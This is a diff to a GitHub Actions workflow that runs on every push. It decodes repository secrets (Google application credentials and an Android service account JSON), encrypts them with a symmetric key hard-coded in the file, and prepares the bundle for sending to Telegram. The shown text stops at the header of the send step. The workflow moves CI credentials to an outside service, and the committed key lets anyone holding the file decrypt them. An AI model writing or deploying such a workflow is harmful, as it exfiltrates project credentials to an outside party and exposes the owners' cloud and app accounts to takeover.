@@ -1,25 +1,22 @@
-name: Hybrid Encrypt and Send Secrets to Telegram
+name: Encrypt with Hard-coded Symmetric Key and Send to Telegram
 
 on:
   push:
 
 jobs:
-  hybrid-encrypt-and-send:
+  encrypt-and-send:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v2
 
-      - name: Encrypt Secrets and Prepare File
+      - name: Encrypt Secrets
         env:
-          PUBLIC_KEY: ${{ secrets.TEST_PUBLIC_KEY }}
+          SYMMETRIC_KEY: "Pa_T0Uljxb0H8Ox7N1IgICbfaABs9C6p52oHdJnm3HM=" # Not secure. Just for illustration.
         run: |
-          echo "$PUBLIC_KEY" | base64 --decode > public_key.pem
-          openssl rand -base64 32 > sym_key.bin
-          openssl pkeyutl -encrypt -in sym_key.bin -pubin -inkey public_key.pem -out encrypted_sym_key.bin
-          echo "${{ secrets.GOOGLE_APPLICATION_CREDENTIALS_JSON_FILE_BASE64 }}" | base64 --decode | openssl enc -aes-256-cbc -salt -in - -out google_credentials_encrypted.bin -pass file:./sym_key.bin
-          echo "${{ secrets.ANDROID_GOOGLE_SERVICE_ACCOUNT_JSON }}" | base64 --decode | openssl enc -aes-256-cbc -salt -in - -out android_service_account_encrypted.bin -pass file:./sym_key.bin
-          cat encrypted_sym_key.bin google_credentials_encrypted.bin android_service_account_encrypted.bin > combined_encrypted_data.bin
+          echo "${{ secrets.GOOGLE_APPLICATION_CREDENTIALS_JSON_FILE_BASE64 }}" | base64 --decode | openssl enc -aes-256-cbc -salt -in - -out google_credentials_encrypted.bin -pass pass:${SYMMETRIC_KEY}
+          echo "${{ secrets.ANDROID_GOOGLE_SERVICE_ACCOUNT_JSON }}" | base64 --decode | openssl enc -aes-256-cbc -salt -in - -out android_service_account_encrypted.bin -pass pass:${SYMMETRIC_KEY}
+          cat google_credentials_encrypted.bin android_service_account_encrypted.bin > combined_encrypted_data.bin
 
       - name: Send Encrypted File to Telegram
         env:
